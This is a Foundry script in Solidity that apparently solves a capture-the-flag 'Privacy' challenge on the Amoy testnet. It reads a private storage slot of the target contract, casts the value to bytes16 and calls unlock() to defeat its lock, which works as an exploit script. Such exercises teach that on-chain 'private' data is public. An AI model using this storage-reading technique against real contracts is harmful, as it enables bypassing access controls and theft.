// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@src/Privacy.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

// forge script script/Privacy.s.sol
// forge script script/Privacy.s.sol --rpc-url $AMOY_RPC_URL --private-key $PRIVATE_KEY
// forge script script/Privacy.s.sol --rpc-url $AMOY_RPC_URL --private-key $PRIVATE_KEY --broadcast

contract PrivacySolution is Script {
    Privacy public privacyInstance = Privacy(0x9341c7f8D89e86476354d3e9C44c2C23C7279544);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));   
        uint256 slot = 5; // The first element [0] of the array is on slot 3 so the third element [2] is on slot 5
        bytes16 target_data = bytes16(vm.load(address(privacyInstance),bytes32(slot)));
        console.log(privacyInstance.locked());
        privacyInstance.unlock(target_data); // The loaded value is a bytes32 so we should cast it to bytes16
        console.log(privacyInstance.locked());
        vm.stopBroadcast();
    }
}